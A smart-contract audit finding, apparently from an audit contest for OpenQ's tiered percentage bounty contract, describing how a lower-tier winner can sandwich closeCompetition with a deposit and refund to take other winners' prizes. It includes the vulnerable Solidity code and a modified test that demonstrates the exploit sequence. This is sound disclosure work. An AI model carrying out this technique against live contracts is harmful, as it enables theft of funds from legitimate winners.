# Can steal funds from other winners in a tiered percentage bounty by sandwhiching closeCompetition with deposit/refund

## Summary

A winner of a tier in a tiered percentage bounty can inflate their winnings by depositing a large sum right before contest close, and withdrawing it right after.

## Vulnerability Detail

Suppose there is a tiered percentage bounty where first place wins 90% and second place wins 10%. Suppose the bounty has 1000 tokens in it.

The second-place winner can front-run the call to `closeCompetition` by depositing 9000 tokens. The contract now has 10000 tokens of funding, and the second prize winner gets 10%, or 1000. The second prize winner then immediately claims their 1000 and refunds their deposit. On net, the second-place winner gets all 1000 tokens, and the first-place winner gets nothing.

If the second-place winner already has their KYC and invoice and whatnot set up so that they can call `permissionedClaimTieredBounty`, and the first-place winner does not, this can be done relatively safely.

## Impact

This permits winners of a single tier in a tiered-percentage bounty contest to claim the entirety of the contest instead of their fair share.

## Code Snippet

Claims are awarded based on fundingTotals computed during a call to closeCompetition.

From https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Bounty/Implementations/TieredPercentageBountyV1.sol#L134

```solidity
        for (uint256 i = 0; i < getTokenAddresses().length; i++) {
            address _tokenAddress = getTokenAddresses()[i];
            fundingTotals[_tokenAddress] = getTokenBalance(_tokenAddress);
        }
```

Here's how it gets paid out. From  https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Bounty/Implementations/TieredPercentageBountyV1.sol#LL113C67-L118C71

```solidity
        uint256 claimedBalance = (payoutSchedule[_tier] *
            fundingTotals[_tokenAddress]) / 100;

        _transferToken(_tokenAddress, claimedBalance, _payoutAddress);
```

Nothing prevents refunds from occurring after the end of a contest.

Here is a modified test exhibiting this problem:

```javascript

	describe('claimTiered', () => {
		it('should transfer volume of tokenAddress balance based on payoutSchedule', async () => {
			// ARRANGE
			const volume = 1000;

			const [, firstPlace, secondPlace] = await ethers.getSigners();

			await tieredContract.connect(depositManager).receiveFunds(owner.address, mockLink.address, volume, Constants.thirtyDays);

			const deposits = await tieredContract.getDeposits();
			const linkDepositId = deposits[0];

			await tieredContract.connect(depositManager).receiveFunds(owner.address, mockLink.address, 9000, 1);
			const deposits2 = await tieredContract.getDeposits();
			const linkDepositId2 = deposits2[1];



			await tieredContract.connect(claimManager).closeCompetition();

			// ASSUME
			const bountyMockTokenBalance = (await mockLink.balanceOf(tieredContract.address)).toString();
			expect(bountyMockTokenBalance).to.equal('10000');

			const claimerMockTokenBalance = (await mockLink.balanceOf(firstPlace.address)).toString();
			expect(claimerMockTokenBalance).to.equal('0');

			// ACT
			await tieredContract.connect(claimManager).claimTiered(firstPlace.address, 2, mockLink.address);


			await tieredContract.connect(depositManager).refundDeposit(linkDepositId2, owner.address, 9000);

			const bountyMockTokenBalance2 = (await mockLink.balanceOf(tieredContract.address)).toString();
			expect(bountyMockTokenBalance2).to.equal('0');
```

## Tool used

Manual Review

## Recommendation

Unclear. One idea is to block refunds for a set period after the contest closes.
